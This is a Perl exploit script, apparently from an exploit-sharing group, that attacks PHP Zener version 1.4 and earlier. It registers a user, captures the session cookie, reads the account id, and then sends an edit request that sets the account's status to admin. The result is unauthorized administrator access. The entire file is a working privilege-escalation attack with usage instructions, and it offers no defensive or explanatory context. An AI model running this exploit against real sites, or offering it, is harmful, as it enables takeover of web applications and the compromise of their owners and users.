use IO::SOCKET;

# ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
# PHP Zener <=1.4 get user-admin exploit
# DSS[TeaM] // www.dss.jino-net.ru
# Write by DoSiS
# ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
#  usage:
# perl zener.pl [url] [dir] [user] [pass]
# ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~

if (@ARGV < 4) {
info();
}

$serv=$ARGV[0];
$fold=$ARGV[1];
$login=$ARGV[2];
$pass=$ARGV[3];

print "[ + ] connecting...\n";

$socket = IO::Socket::INET->new(
Proto => "tcp",
PeerAddr => "$serv",
PeerPort => "80") || die "$socket error connect!";

print "[ + ] registration user\n";

$path  = "http://$serv";
$path .= $fold;
$path .= 'register.php?isok=yes&name=';
$path .= $login;
$path .= '&pass=';
$path .= $pass;
$path .= '&email_=dss@dss.dss';

print $socket "GET $path HTTP/1.0\r\n\r\n";

@ans = <$socket>;
foreach $_ (@ans) {
if (/Set-Cookie/) {
$ses = substr($_,22,32);
}}

$socket = IO::Socket::INET->new(
Proto => "tcp",
PeerAddr => "$serv",
PeerPort => "80") || die "$socket error connect!";

$path  = "http://$serv";
$path .= $fold;
$path .= 'index.php?page=inf_red.php';

print "[ + ] get id number\n";

print $socket "GET $path HTTP/1.0\n";
print $socket "Cookie: PHPSESSID=$ses\r\n\r\n";

@ans = <$socket>;
foreach $_ (@ans) {
if (/name=\"ed\"/) {
$ed = substr($_,38);
}}

if ($ed eq "") {
print "[ - ] change your user name\n";
exit;}

if ($ed=~/\r\n/) {
$ed =~ s/">\r\n//g;
}
else {
$ed =~ s/">\n//g;
}

$socket = IO::Socket::INET->new(
Proto => "tcp",
PeerAddr => "$serv",
PeerPort => "80") || die "$socket error connect!";

$path  = "http://$serv";
$path .= $fold;
$path .= 'edit.php?ed=';
$path .= $ed;
$path .= '&stat=admin&pass_=';
$path .= $pass;
$path .= '&email_=dss@dss.dss';

print "[ + ] edit user on admin\n";

print $socket "GET $path HTTP/1.0\n";
print $socket "Cookie: PHPSESSID=$ses\r\n\r\n";

print "[ + ] mission complete\n";

sub info() {
print q(############################################################
	PHP Zener <=1.4 get user-admin exploit
	   DSS[TeaM] // www.dss.jino-net.ru
		  Write by DoSiS
############################################################
  usage:
 perl zener.pl [url] [dir] [user] [pass]
############################################################
);
exit;
}
